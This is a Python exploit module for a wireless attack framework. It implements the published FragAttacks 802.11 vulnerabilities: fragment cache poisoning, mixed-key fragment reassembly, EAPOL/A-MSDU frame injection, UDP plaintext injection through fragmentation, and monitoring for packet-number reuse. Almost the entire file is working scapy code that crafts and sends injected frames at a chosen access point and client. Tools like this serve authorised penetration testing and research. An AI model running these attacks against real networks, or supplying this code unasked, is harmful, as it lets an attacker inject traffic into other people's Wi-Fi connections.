#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native FragAttacks — 802.11 fragmentation and aggregation vulnerabilities.

Implements the core attack primitives from the FragAttacks research
(CVE-2020-24586 through CVE-2020-26146):

  - fragment_cache_poison    Inject rogue fragments into victim's cache
  - mixed_key_attack         Send fragments encrypted with different keys
  - amsdu_injection          A-MSDU frame injection via subframe crafting
  - eapol_plaintext_inject   Inject plaintext frames via EAPOL/A-MSDU
  - broadcast_fragment_cache Broadcast fragment cache poisoning
  - pn_reuse_test            Test for PN/IV reuse after rekeying
  - udp_plaintext_inject     Inject UDP plaintext payload via fragmentation

Each attack crafts specific 802.11 frames using scapy. The module provides
both individual primitives and combined test sequences.

Improvements incorporated from upstream vanhoefm/fragattacks:
  - Pre-test delay option (PR #44)
  - UDP plaintext injection mode (issue #56)
  - 802.11ax compatibility notes (issue #55)

Requires: Monitor mode interface with frame injection capability.
Dependencies: scapy, pycryptodome (for CCMP encryption).

Version: 1.1.0
"""

from __future__ import annotations

import logging
import os
import struct
import subprocess
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

try:
    from scapy.all import (
        ARP, DHCP, EAPOL, ICMP, IP, LLC, SNAP, UDP,
        Dot11, Dot11CCMP, Dot11Deauth, Dot11Elt, Dot11QoS,
        Ether, RadioTap, Raw, conf, sendp, sniff, wrpcap,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from Cryptodome.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False


# 802.11 frame flags
FLAG_MORE_FRAG = 0x04
FLAG_TO_DS = 0x01
FLAG_FROM_DS = 0x02
FLAG_PROTECTED = 0x40

# A-MSDU subframe
AMSDU_FLAG = 0x80


def _build_data_header(src: str, dst: str, bssid: str,
                       to_ds: bool = True, frag: int = 0,
                       seq: int = 0, more_frags: bool = False,
                       qos_tid: int = 0) -> Dot11:
    """Build a Dot11 data frame header."""
    fc_field = "to-DS" if to_ds else "from-DS"
    if more_frags:
        fc_field += "+MF"

    if to_ds:
        header = Dot11(
            type=2, subtype=8, FCfield=fc_field,
            addr1=bssid, addr2=src, addr3=dst,
            SC=(seq << 4) | frag,
        ) / Dot11QoS(TID=qos_tid)
    else:
        header = Dot11(
            type=2, subtype=8, FCfield=fc_field,
            addr1=dst, addr2=bssid, addr3=src,
            SC=(seq << 4) | frag,
        ) / Dot11QoS(TID=qos_tid)

    return header


def build_fragment_pair(src: str, dst: str, bssid: str,
                        payload: bytes, split_at: int = 0,
                        seq: int = 1, tid: int = 0) -> Tuple:
    """Build a pair of 802.11 data fragments.

    Args:
        src: Source MAC.
        dst: Destination MAC.
        bssid: AP BSSID.
        payload: Full LLC/SNAP + IP payload.
        split_at: Byte offset to split at (0 = auto-split at midpoint).
        seq: Sequence number.
        tid: QoS TID.

    Returns:
        Tuple of (fragment1, fragment2).
    """
    if split_at <= 0:
        split_at = len(payload) // 2

    frag1_hdr = _build_data_header(src, dst, bssid, frag=0, seq=seq,
                                    more_frags=True, qos_tid=tid)
    frag2_hdr = _build_data_header(src, dst, bssid, frag=1, seq=seq,
                                    more_frags=False, qos_tid=tid)

    frag1 = RadioTap() / frag1_hdr / Raw(payload[:split_at])
    frag2 = RadioTap() / frag2_hdr / Raw(payload[split_at:])

    return frag1, frag2


def build_amsdu_subframe(src: str, dst: str, payload: bytes) -> bytes:
    """Build an A-MSDU subframe (RFC 4042 / 802.11n).

    Format: DA(6) + SA(6) + Length(2) + payload + padding(0-3).
    """
    da = bytes.fromhex(dst.replace(":", ""))
    sa = bytes.fromhex(src.replace(":", ""))
    length = struct.pack(">H", len(payload))
    subframe = da + sa + length + payload

    padding_len = (4 - (len(subframe) % 4)) % 4
    return subframe + b"\x00" * padding_len


def build_eapol_amsdu_injection(src: str, dst: str, bssid: str,
                                 inner_payload: bytes,
                                 seq: int = 1) -> bytes:
    """Build EAPOL/A-MSDU injection frame (CVE-2020-26144).

    Crafts a frame that looks like EAPOL to bypass plaintext checks,
    but contains an A-MSDU subframe with arbitrary payload.
    """
    eapol_header = bytes(LLC() / SNAP() / EAPOL())

    amsdu_subframe = build_amsdu_subframe(dst, src, inner_payload)

    header = _build_data_header(src, dst, bssid, frag=0, seq=seq)
    header[Dot11QoS].A_MSDU_Present = 1

    frame = RadioTap() / header / Raw(eapol_header + amsdu_subframe)
    return frame


class Exploit(Exploit):
    """Native 802.11 FragAttacks — fragmentation/aggregation vulnerabilities."""

    __info__ = {
        "name": "FragAttacks (CVE-2020-24586..26146)",
        "description": (
            "802.11 fragmentation and aggregation attack primitives. "
            "Fragment cache poisoning, mixed-key fragment reassembly, "
            "A-MSDU injection via EAPOL, broadcast fragment cache attacks, "
            "and PN/IV reuse detection. Native scapy implementation of "
            "Mathy Vanhoef's FragAttacks research."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Mathy Vanhoef (2021)",
        ),
        "references": (
            "https://www.fragattacks.com/",
            "https://github.com/vanhoefm/fragattacks",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor mode interface with injection")
    attack = OptString(
        "cache_poison",
        "Attack: cache_poison | mixed_key | amsdu_inject | eapol_inject | udp_inject | pn_test",
    )
    target_bssid = OptMAC("", "Target AP BSSID")
    target_client = OptMAC("", "Target client MAC address")
    attacker_ip = OptString("192.168.1.100", "Attacker IP for payload injection")
    target_ip = OptString("192.168.1.1", "Target IP for payload injection")
    target_port = OptInteger(80, "Target port for UDP plaintext injection")
    channel = OptInteger(1, "Wi-Fi channel")
    inject_count = OptInteger(10, "Number of injection rounds")
    qos_tid = OptInteger(0, "QoS TID for fragment injection")
    pre_test_delay = OptFloat(0.0, "Delay (seconds) before each test/injection round")
    inject_delay = OptFloat(0.05, "Delay (seconds) between injected frames")
    output_pcap = OptString("fragattacks_capture.pcap", "Output PCAP file")
    dry_run = OptBool(False, "Show configuration without executing")

    def _detect_he_capabilities(self) -> bool:
        """Best-effort check for 802.11ax (HE) capability on interface PHY.

        Returns:
            True when HE capabilities are detected, False otherwise.
        """
        iface = str(self.interface).strip()
        if not iface:
            return False

        try:
            dev_info = subprocess.run(
                ["iw", "dev", iface, "info"],
                capture_output=True,
                text=True,
                check=False,
            )
            if dev_info.returncode != 0:
                return False

            phy_name = ""
            for line in dev_info.stdout.splitlines():
                line = line.strip()
                if line.startswith("wiphy "):
                    phy_idx = line.split()[-1]
                    phy_name = "phy{}".format(phy_idx)
                    break

            if not phy_name:
                return False

            phy_info = subprocess.run(
                ["iw", "phy", phy_name, "info"],
                capture_output=True,
                text=True,
                check=False,
            )
            if phy_info.returncode != 0:
                return False

            output = phy_info.stdout
            return ("HE Iftypes" in output) or ("HE Capabilities" in output)
        except Exception:
            return False

    def _apply_pre_test_delay(self) -> None:
        """Apply configured pre-test delay if set."""
        if self.pre_test_delay > 0:
            logger.info("Pre-test delay: %.1fs", self.pre_test_delay)
            time.sleep(self.pre_test_delay)

    def _cache_poison_attack(self) -> None:
        """Fragment cache poisoning (CVE-2020-24586).

        Injects a rogue first fragment into the victim's fragment cache.
        When a legitimate second fragment arrives, it reassembles with
        the poisoned first fragment, injecting attacker content.
        """
        self._apply_pre_test_delay()
        print_status("Fragment cache poisoning attack...")

        poison_payload = bytes(LLC() / SNAP() / IP(
            src=self.attacker_ip, dst=self.target_ip,
        ) / ICMP() / Raw(b"FRAGATTACK_CACHE_POISON"))

        frag1, _ = build_fragment_pair(
            self.target_client, self.target_bssid, self.target_bssid,
            poison_payload, seq=42, tid=self.qos_tid,
        )

        for i in range(self.inject_count):
            sendp(frag1, iface=self.interface, verbose=False)
            time.sleep(self.inject_delay)

        print_success("Injected {} poisoned first fragments (seq=42, tid={}).".format(
            self.inject_count, self.qos_tid))

    def _mixed_key_attack(self) -> None:
        """Mixed key fragment reassembly (CVE-2020-24587).

        Sends first fragment before rekeying and second fragment after.
        Vulnerable implementations reassemble fragments encrypted with
        different temporal keys.
        """
        self._apply_pre_test_delay()
        print_status("Mixed key fragment attack...")
        print_info("This attack requires triggering a rekey between fragments.")

        payload = bytes(LLC() / SNAP() / IP(
            src=self.attacker_ip, dst=self.target_ip,
        ) / ICMP() / Raw(b"MIXED_KEY_TEST_PAYLOAD"))

        frag1, frag2 = build_fragment_pair(
            self.target_client, self.target_bssid, self.target_bssid,
            payload, seq=100, tid=self.qos_tid,
        )

        print_info("Sending fragment 1 (before rekey)...")
        sendp(frag1, iface=self.interface, count=3, verbose=False)

        print_info("Waiting 5s for rekey to occur (trigger manually if needed)...")
        time.sleep(5)

        print_info("Sending fragment 2 (after rekey)...")
        sendp(frag2, iface=self.interface, count=3, verbose=False)

        print_success("Mixed key fragments sent. Check if target reassembled.")

    def _amsdu_injection_attack(self) -> None:
        """A-MSDU injection via EAPOL (CVE-2020-26144).

        Crafts frames that appear as EAPOL (bypassing plaintext acceptance)
        but contain A-MSDU subframes with arbitrary payload.
        """
        self._apply_pre_test_delay()
        print_status("EAPOL/A-MSDU injection attack...")

        inner = bytes(IP(
            src=self.attacker_ip, dst=self.target_ip,
        ) / ICMP() / Raw(b"AMSDU_INJECT_TEST"))

        frame = build_eapol_amsdu_injection(
            self.target_client, self.target_bssid, self.target_bssid,
            inner, seq=200,
        )

        for i in range(self.inject_count):
            sendp(frame, iface=self.interface, verbose=False)
            time.sleep(self.inject_delay)

        print_success("Injected {} EAPOL/A-MSDU frames.".format(self.inject_count))

    def _udp_plaintext_inject(self) -> None:
        """UDP plaintext injection via fragmentation (issue #56).

        Injects a plaintext UDP payload by splitting it across 802.11
        fragments, bypassing encryption checks on some implementations.
        """
        self._apply_pre_test_delay()
        print_status("UDP plaintext injection via fragmentation...")

        udp_payload = bytes(LLC() / SNAP() / IP(
            src=self.attacker_ip, dst=self.target_ip,
        ) / UDP(dport=self.target_port, sport=12345) / Raw(
            b"FRAGATTACK_UDP_INJECT"))

        frag1, frag2 = build_fragment_pair(
            self.target_client, self.target_bssid, self.target_bssid,
            udp_payload, seq=300, tid=self.qos_tid,
        )

        for i in range(self.inject_count):
            sendp(frag1, iface=self.interface, verbose=False)
            time.sleep(self.inject_delay / 2)
            sendp(frag2, iface=self.interface, verbose=False)
            time.sleep(self.inject_delay)

        print_success("Injected {} UDP plaintext fragment pairs to port {}.".format(
            self.inject_count, self.target_port))

    def _pn_reuse_test(self) -> None:
        """Test for PN/IV reuse after rekeying (CVE-2020-24588).

        Monitors for PN resets to zero after group key handshake, which
        would allow replay attacks.
        """
        print_status("Monitoring for PN/IV reuse patterns...")
        seen_pns: Dict[str, List[int]] = {}

        def _monitor(pkt):
            if pkt.haslayer(Dot11CCMP) and pkt.addr2:
                mac = pkt.addr2
                pn = (pkt[Dot11CCMP].PN5 << 40 | pkt[Dot11CCMP].PN4 << 32 |
                      pkt[Dot11CCMP].PN3 << 24 | pkt[Dot11CCMP].PN2 << 16 |
                      pkt[Dot11CCMP].PN1 << 8 | pkt[Dot11CCMP].PN0)

                if mac not in seen_pns:
                    seen_pns[mac] = []

                if seen_pns[mac] and pn <= seen_pns[mac][-1]:
                    print_success("[PN REUSE] {} PN={} <= prev={}".format(
                        mac, pn, seen_pns[mac][-1]))

                seen_pns[mac].append(pn)
                if len(seen_pns[mac]) > 1000:
                    seen_pns[mac] = seen_pns[mac][-500:]

        try:
            sniff(iface=self.interface, prn=_monitor, store=False,
                  timeout=60)
        except KeyboardInterrupt:
            pass

        for mac, pns in seen_pns.items():
            if pns:
                print_info("{}: {} PNs observed, range [{}, {}]".format(
                    mac, len(pns), min(pns), max(pns)))

    def run(self) -> None:
        """Execute FragAttacks test."""
        if not HAS_SCAPY:
            print_error("scapy is required. Install: pip install scapy")
            return

        if not self.target_bssid:
            print_error("target_bssid is required.")
            return

        if self.dry_run:
            print_info("FragAttacks Configuration:")
            print_info("  Interface: {}".format(self.interface))
            print_info("  Attack:    {}".format(self.attack))
            print_info("  BSSID:     {}".format(self.target_bssid))
            print_info("  Client:    {}".format(self.target_client))
            print_info("  Channel:   {}".format(self.channel))
            return

        if os.getuid() != 0:
            print_error("Root privileges required.")
            return

        he_capable = self._detect_he_capabilities()
        if he_capable:
            print_info("HE (802.11ax) capability detected on interface PHY.")
        else:
            print_info(
                "HE (802.11ax) capability not detected. Using legacy-compatible "
                "frame crafting fallback for non-HE dongles."
            )

        attacks = {
            "cache_poison": self._cache_poison_attack,
            "mixed_key": self._mixed_key_attack,
            "amsdu_inject": self._amsdu_injection_attack,
            "eapol_inject": self._amsdu_injection_attack,
            "udp_inject": self._udp_plaintext_inject,
            "pn_test": self._pn_reuse_test,
        }

        handler = attacks.get(self.attack)
        if handler:
            handler()
        else:
            print_error("Unknown attack: {}. Options: {}".format(
                self.attack, " | ".join(attacks.keys())))
